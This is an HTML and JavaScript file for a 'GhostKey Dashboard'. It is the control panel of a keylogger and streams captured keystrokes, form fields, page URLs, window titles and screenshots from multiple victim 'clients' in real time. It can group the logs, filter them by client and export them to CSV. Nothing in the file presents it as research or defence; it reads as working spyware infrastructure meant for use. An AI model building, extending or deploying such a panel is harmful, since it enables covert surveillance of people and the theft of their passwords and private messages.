<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GhostKey Dashboard</title>
  <style>
    :root{--bg:#040506;--bg-alt:#05070b;--bg-row:#070a10;--bg-row-alt:#0b0f18;--text:#e5e5e5;--text-muted:#7f8c8d;--border:#151822;--accent:#26ff80;--accent-soft:#0b3b23;--pill-bg:#0f1722;--pill-border:#1f2937;--pill-special-bg:#251332;--pill-special-border:#c678dd;--pill-space-bg:#0b3b23;--pill-space-border:#26ff80;--shadow-dot:0 0 10px #26ff80}
    body.light{--bg:#f4f5f8;--bg-alt:#fff;--bg-row:#fff;--bg-row-alt:#eef1f7;--text:#111827;--text-muted:#4b5563;--border:#d1d5db;--accent:#16a34a;--accent-soft:#bbf7d0;--pill-bg:#e5e7eb;--pill-border:#cbd5f5;--pill-special-bg:#f3ddff;--pill-special-border:#c678dd;--pill-space-bg:#bbf7d0;--pill-space-border:#16a34a;--shadow-dot:0 0 4px #16a34a}
    *{box-sizing:border-box}
    body{background:radial-gradient(circle at top left,#071018 0,#020308 55%,#000 100%);color:var(--text);font-family:"JetBrains Mono",Menlo,monospace;margin:0;padding:0}
    header{padding:14px 20px;border-bottom:1px solid var(--border);background:rgba(5,7,11,.95);backdrop-filter:blur(8px);position:sticky;top:0;z-index:10}
    .header-top{display:flex;align-items:center;justify-content:space-between;gap:10px}
    .status{display:flex;align-items:center;gap:10px}
    .dot{width:14px;height:14px;border-radius:50%;background:#26ff80;box-shadow:var(--shadow-dot)}
    h1{font-size:20px;margin:0;letter-spacing:.08em;text-transform:uppercase}
    .subtitle{font-size:11px;color:var(--text-muted);margin-top:3px}
    .controls{display:flex;gap:10px;flex-wrap:wrap;justify-content:flex-end}
    .btn{padding:6px 10px;border:1px solid var(--border);background:#05070b;color:var(--text);border-radius:4px;font-size:11px;cursor:pointer;text-transform:uppercase}
    .btn:hover{border-color:var(--accent);color:var(--accent)}
    .badge{font-size:11px;padding:4px 8px;border-radius:999px;background:#05070b;border:1px solid var(--border);color:var(--text-muted)}
    .client-tabs{display:flex;flex-wrap:wrap;gap:6px;margin-top:2px}
    .client-tab{padding:4px 10px;border-radius:999px;border:1px solid var(--border);background:#020409;color:var(--text-muted);font-size:11px;cursor:pointer;text-transform:uppercase}
    .client-tab.active{border-color:var(--accent);background:#0b3b23;color:#ecfdf5}
    main{padding:14px 20px 30px}
    table{width:100%;border-collapse:collapse;margin-top:10px;font-size:13px}
    thead{background:rgba(5,7,11,.98);position:sticky;top:90px;z-index:5}
    th,td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top}
    th{text-align:left;font-weight:600;color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:.08em}
    tbody tr:nth-child(even){background:rgba(7,10,16,.9)}
    tbody tr:nth-child(odd){background:rgba(11,15,24,.9)}
    tbody tr:hover{background:#050814}
    .col-id{width:40px;color:var(--text-muted);font-size:11px}
    .col-time{width:150px;font-size:11px;color:#e5e7eb}
    .col-client{width:120px;font-size:11px;color:#cbd5f5}
    .col-window{width:220px;font-size:11px;color:#9ca3af;word-break:break-word}
    .col-url a{color:var(--accent);text-decoration:none;word-break:break-all;font-size:12px}
    .col-url a:hover{text-decoration:underline}
    .col-keys{white-space:pre-wrap;word-break:break-word;font-size:12px}
    .col-screenshot{width:140px;text-align:center}
    .screenshot-thumb{width:120px;height:68px;object-fit:cover;border-radius:6px;cursor:pointer;border:1px solid var(--border)}
    .no-logs{text-align:center;padding:40px 10px;color:var(--text-muted);font-size:13px}
    .modal{display:none;position:fixed;z-index:9999;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,.97);justify-content:center;align-items:center}
    .modal img{max-width:95vw;max-height:95vh;border-radius:8px;box-shadow:0 0 40px rgba(38,255,128,.6)}
    .modal-close{position:absolute;top:20px;right:30px;color:#fff;font-size:50px;cursor:pointer}
  </style>
</head>
<body>
  <header>
    <div class="header-top">
      <div class="status">
        <div class="dot"></div>
        <div>
          <h1>GhostKey Dashboard</h1>
          <div class="subtitle">native + browser • window titles • screenshots • realtime</div>
        </div>
      </div>
      <div class="controls">
        <input id="filterInput" type="text" placeholder="Filter by window, URL, keys, client..." />
        <button id="groupToggle" class="btn">Group by URL: ON</button>
        <button id="themeToggle" class="btn">Theme: Dark</button>
        <button id="downloadBtn" class="btn">Download CSV</button>
        <button id="clearBtn" class="btn">Clear</button>
        <span class="badge" id="countBadge">0 entries</span>
      </div>
    </div>
    <div class="client-tabs" id="clientTabs"></div>
  </header>
  <main>
    <table>
      <thead>
        <tr>
          <th class="col-id">#</th>
          <th class="col-time">Time</th>
          <th class="col-client">Client</th>
          <th class="col-window">Window / Field</th>
          <th class="col-url">Page URL</th>
          <th class="col-keys">Text</th>
          <th class="col-screenshot">Screenshot</th>
        </tr>
      </thead>
      <tbody id="logBody">
        <tr><td colspan="7" class="no-logs">Waiting for logs...</td></tr>
      </tbody>
    </table>
  </main>

  <div id="screenshotModal" class="modal" onclick="this.style.display='none'">
    <div class="modal-close" onclick="document.getElementById('screenshotModal').style.display='none'">×</div>
    <img id="fullImage" src="" />
  </div>

  <script>
    let logs=[],nextId=1,filterText="",groupedMode=true,activeClientFilter="ALL",MAX_LOGS=1000;
    const logBody=document.getElementById("logBody"),filterInput=document.getElementById("filterInput"),countBadge=document.getElementById("countBadge"),groupToggle=document.getElementById("groupToggle"),themeToggle=document.getElementById("themeToggle"),downloadBtn=document.getElementById("downloadBtn"),clearBtn=document.getElementById("clearBtn"),clientTabs=document.getElementById("clientTabs");

    function applyTheme(t){document.body.className=t==="light"?"light":"";themeToggle.textContent="Theme: "+(t==="light"?"Light":"Dark");localStorage.setItem("dashboard_theme",t)}
    applyTheme(localStorage.getItem("dashboard_theme")||"dark");
    themeToggle.addEventListener("click",()=>applyTheme(document.body.classList.contains("light")?"dark":"light"));

    function normalizeLog(d){
      const isNative=!!d.win||d.Screenshot;
      return{
        id:nextId++,
        time:(d.ts||d.serverReceivedAt||new Date().toISOString()).replace("T"," ").slice(0,19),
        client:d.client||"unknown",
        window:isNative?(d.win||"Unknown Window"):(d.field||"unknown"),
        url:isNative?"Native App":(d.url||"N/A"),
        keys:Array.isArray(d.keys)?d.keys.map(String):[String(d.keys||"")],
        screenshot:d.Screenshot||d.screenshot||""
      };
    }

    function formatKeys(a){return a.map(k=>k===" "?" ":k.match(/^\[(.+)\]$/)?` [${k.slice(1,-1).toLowerCase()}] `:k).join("")}

    function matchesFilter(l){
      if(activeClientFilter!=="ALL"&&l.client!==activeClientFilter)return false;
      if(!filterText)return true;
      const f=filterText.toLowerCase();
      return[l.window,l.url,l.client,l.keys.join(" ")].some(s=>s.toLowerCase().includes(f));
    }

    function rebuildClientTabs(){
      const c=new Set(logs.map(l=>l.client));
      clientTabs.innerHTML="";
      const b=(label,val)=>{const el=document.createElement("button");el.className="client-tab"+(val===activeClientFilter?" active":"");el.textContent=label;el.onclick=()=>{activeClientFilter=val;rebuildClientTabs();render()};clientTabs.appendChild(el);}
      b("ALL","ALL");[...c].sort().forEach(x=>b(x,x));
    }

    function render(){
      logBody.innerHTML="";const f=logs.filter(matchesFilter);countBadge.textContent=f.length+" entr"+(f.length===1?"y":"ies");
      if(!f.length){logBody.innerHTML=`<tr><td colspan="7" class="no-logs">No logs to display yet.</td></tr>`;return;}
      if(!groupedMode){f.forEach(l=>addRow(l));}
      else{
        const g=new Map();
        f.forEach(l=>{const k=`${l.url}||${l.client}`;if(!g.has(k))g.set(k,{logs:[],latest:l});g.get(k).logs.push(...l.keys);});
        let i=1;
        [...g.entries()].sort((a,b)=>b[1].latest.time.localeCompare(a[1].latest.time)).forEach(([_,v])=>addRow({...v.latest,keys:v.logs,count:v.logs.length},true,i++));
      }
    }

    function addRow(l,isGroup=false,idx=null){
      const tr=document.createElement("tr");
      tr.innerHTML=`
        <td class="col-id">#${idx!==null?idx:l.id}</td>
        <td class="col-time">${l.time}${isGroup?`<br><span class="group-label">${l.count||1} batches</span>`:""}</td>
        <td class="col-client">${l.client}</td>
        <td class="col-window">${l.window}</td>
        <td class="col-url"><a href="${l.url}" target="_blank">${l.url==="Native App"?"—":l.url}</a></td>
        <td class="col-keys">${formatKeys(l.keys)}</td>
        <td class="col-screenshot">${l.screenshot?`<img class="screenshot-thumb" src="${l.screenshot}" onclick="document.getElementById('fullImage').src=this.src;document.getElementById('screenshotModal').style.display='flex'">`:"—"}</td>
      `;
      logBody.appendChild(tr);
    }

    filterInput.addEventListener("input",e=>{filterText=e.target.value.trim();render()});
    groupToggle.addEventListener("click",()=>{groupedMode=!groupedMode;groupToggle.textContent="Group by URL: "+(groupedMode?"ON":"OFF");render()});
    clearBtn.addEventListener("click",()=>{logs=[];nextId=1;rebuildClientTabs();render()});
    downloadBtn.addEventListener("click",()=>{
      if(!logs.length)return;
      const rows=[["id","time","client","window","url","keys"]];
      logs.forEach(l=>rows.push([l.id,l.time,l.client,l.window,l.url,l.keys.join(" ")]));
      const csv=rows.map(r=>r.map(v=>`"${String(v).replace(/"/g,'""')}"`).join(",")).join("\n");
      const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([csv],{type:"text/csv"}));a.download="ghostkey-"+new Date().toISOString().slice(0,19).replace(/:/g,"-")+".csv";a.click();
    });

    const es=new EventSource("/stream");
    es.onmessage=e=>{
      try{const d=JSON.parse(e.data);logs.unshift(normalizeLog(d));if(logs.length>MAX_LOGS)logs.pop();rebuildClientTabs();render();}
      catch(err){console.error(err);}
    };
  </script>
</body>
</html>
EOF